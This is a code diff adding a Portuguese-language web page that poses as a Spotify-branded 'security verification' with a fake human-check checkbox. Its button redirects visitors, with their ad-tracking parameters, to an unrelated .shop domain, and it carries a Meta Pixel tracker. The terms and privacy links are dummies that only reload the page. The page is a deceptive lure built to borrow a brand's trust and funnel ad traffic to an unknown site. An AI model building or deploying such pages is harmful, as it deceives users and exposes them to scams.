@@ -1,0 +1,179 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+     <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+   
+    <!-- Meta Pixel Code -->
+  <script>
+  !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+  n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '4053625494857896');
+  fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=4053625494857896&ev=PageView&noscript=1"/></noscript>
+  <!-- End Meta Pixel Code -->
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Segurança</title>
+    <style>
+        :root {
+            --spotify-green: #1DB954;
+            --spotify-black: #191414;
+            --light-gray: #f8f8f8;
+            --border-color: #d1d5db;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: var(--spotify-black);
+        }
+
+        .container {
+            text-align: center;
+            max-width: 400px;
+            padding: 20px;
+        }
+
+        .captcha-box {
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: var(--light-gray);
+            margin-bottom: 25px;
+        }
+
+        .checkbox-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        input[type="checkbox"] {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            accent-color: var(--spotify-green);
+        }
+
+        .captcha-text {
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .btn-continue {
+            background-color: var(--spotify-green);
+            color: white;
+            border: none;
+            padding: 14px 32px;
+            border-radius: 500px;
+            font-weight: bold;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s ease;
+            opacity: 0.5;
+            pointer-events: none;
+        }
+
+        .btn-continue.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .btn-continue:hover {
+            transform: scale(1.04);
+            background-color: #1ed760;
+        }
+
+        .footer-terms {
+            margin-top: 30px;
+            font-size: 11px;
+            color: #6a6a6a;
+            line-height: 1.5;
+        }
+
+        .footer-terms a {
+            color: #6a6a6a;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div style="margin-bottom: 30px;">
+        <svg width="50" height="50" viewBox="0 0 24 24" fill="#1DB954" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.494 17.306c-.217.355-.679.467-1.032.249-2.864-1.75-6.468-2.146-10.713-1.176-.405.093-.81-.16-.903-.565-.093-.404.159-.81.564-.903 4.654-1.064 8.63-.615 11.835 1.34.353.218.465.679.249 1.035zm1.465-3.259c-.273.443-.852.583-1.295.31-3.277-2.013-8.273-2.597-12.148-1.42-.501.152-1.033-.133-1.185-.634-.152-.501.133-1.033.634-1.185 4.434-1.345 9.944-.688 13.684 1.61.444.272.584.852.31 1.294zm.126-3.411C15.362 8.204 8.707 7.983 4.85 9.154c-.62.188-1.274-.168-1.463-.788-.188-.62.168-1.274.788-1.463 4.433-1.345 11.785-1.085 16.142 1.502.557.33.739 1.05.409 1.607-.33.557-1.05.739-1.607.409z"></path>
+        </svg>
+        <h2 style="font-size: 20px; margin-top: 15px;">Confirme que você é um Humano!</h2>
+    </div>
+
+    <div class="captcha-box">
+        <div class="checkbox-wrapper">
+            <input type="checkbox" id="humanCheck">
+            <span class="captcha-text">Sou um humano</span>
+        </div>
+        <img src="images/logo_48.png" alt="reCAPTCHA" width="30" onerror="this.style.display='none'" style="display: none;">
+    </div>
+
+    <button class="btn-continue" id="continueBtn" onclick="redirectUser()">Continuar</button>
+    <div class="footer-terms">
+        Ao clicar em continuar, você concorda com os 
+        <a href="javascript:void(0)" onclick="location.reload()">Termos de Uso</a> e a 
+        <a href="javascript:void(0)" onclick="location.reload()">Política de Privacidade</a> do serviço. 
+        Esta verificação ajuda a proteger sua conta e a comunidade.
+    </div>
+</div>
+
+<script>
+    const checkbox = document.getElementById('humanCheck');
+    const button = document.getElementById('continueBtn');
+
+    checkbox.addEventListener('change', function() {
+        if (this.checked) {
+            button.classList.add('active');
+        } else {
+            button.classList.remove('active');
+        }
+    });
+
+    function redirectUser() {
+        // Link para onde o usuário será enviado
+        const targetUrl = "https://acessaragora.shop/branca/";
+        
+        // Pega todos os parâmetros (UTMs) da URL atual (ex: ?utm_source=fb&utm_campaign=teste)
+        const urlParams = window.location.search;
+
+        // Lógica para verificar se deve usar '?' ou '&' na concatenação
+        if (urlParams) {
+            // Se a URL de destino já tiver '?', usamos '&' para adicionar os novos parâmetros
+            if (targetUrl.indexOf('?') > -1) {
+                window.location.href = targetUrl + "&" + urlParams.substring(1);
+            } else {
+                // Se não tiver, apenas concatenamos o que pegamos da URL atual
+                window.location.href = targetUrl + urlParams;
+            }
+        } else {
+            // Se não houver parâmetros na URL atual, redireciona normal
+            window.location.href = targetUrl;
+        }
+    }
+</script>
+
+
+</body></html>
